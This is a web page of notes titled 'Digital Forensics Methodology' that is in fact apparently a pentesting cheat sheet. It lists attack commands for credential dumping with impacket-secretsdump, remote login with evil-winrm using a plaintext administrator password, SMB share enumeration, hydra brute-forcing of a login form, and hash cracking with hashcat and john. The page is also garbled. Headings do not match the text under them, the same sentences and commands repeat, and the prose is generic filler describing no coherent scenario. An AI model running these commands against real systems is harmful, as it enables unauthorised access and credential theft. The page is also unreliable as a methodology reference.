---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, malware, privilege escalation"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-821.html"
URL_IMAGES: ""
Date: "2024-02-02"
Tags: "DFIR, Malware, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-821"
Permalink: "/notes/note-digital-forensics-methodology-821.html"
BtnLabel: "Read Notes"
Pick: 0
---
## kerbrute

### feroxbuster

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.24.172
evil-winrm -i 10.82.158.1 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.60.136.171 -u administrator -p 'P@ssw0rd!' --shares
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.55.37.188/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.10.153/FUZZ
feroxbuster -h
```

## Windows Server 2019

### Local File Inclusion

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.35.113
```

```bash
evil-winrm -i 10.23.201.91 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.122.202.80 -u administrator -p 'P@ssw0rd!' --shares
```

> **Note:** XSS was identified as the primary attack vector in this scenario.

## evil-winrm

### POP3

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.12.134/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.48.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `msfvenom`
- `SeDebugPrivilege`
- `AS-REP Roasting`

## Remote File Inclusion

### nikto

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.129.85 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p135,1521,22 10.116.118.42 -oN scan.txt
evil-winrm -i 10.65.125.51 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## wpscan

### Ruby on Rails

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
